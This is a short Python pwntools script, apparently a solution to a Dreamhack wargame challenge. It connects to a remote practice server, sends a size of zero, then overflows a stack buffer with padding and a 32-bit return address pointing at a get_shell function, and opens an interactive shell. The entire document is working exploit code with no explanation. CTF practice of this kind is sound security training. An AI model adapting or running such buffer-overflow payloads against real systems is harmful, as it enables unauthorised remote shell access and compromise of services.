from pwn import *

p=remote("host3.dreamhack.games",22735)

p.sendlineafter("Size: ",b"0")

get_shell=0x8048659
payload=b'A'*0x104+b'B'*0x4+p32(get_shell)

p.sendline(payload)

p.interactive()